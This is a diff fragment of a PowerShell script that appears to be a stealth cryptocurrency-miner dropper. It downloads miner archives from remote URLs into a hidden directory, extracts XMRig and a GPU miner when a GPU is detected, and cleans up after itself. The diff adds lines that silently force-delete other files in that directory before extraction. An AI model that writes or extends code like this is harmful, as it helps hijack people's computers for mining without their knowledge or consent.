@@ -52,6 +52,7 @@ $GpuExe = Join-Path $StealthDir $Name2
 
 if (-not (Test-Path $CpuExe)) {
     if (Get-StealthFile $MinerUrl $CpuZip) {
+        try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
         [System.IO.Compression.ZipFile]::ExtractToDirectory($CpuZip, $StealthDir)
         Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
@@ -73,6 +74,7 @@ try {
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     if (Get-StealthFile $GpuMinerUrl $GpuZip) {
+        try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat", "$Name1" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
         [System.IO.Compression.ZipFile]::ExtractToDirectory($GpuZip, $StealthDir)
         Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
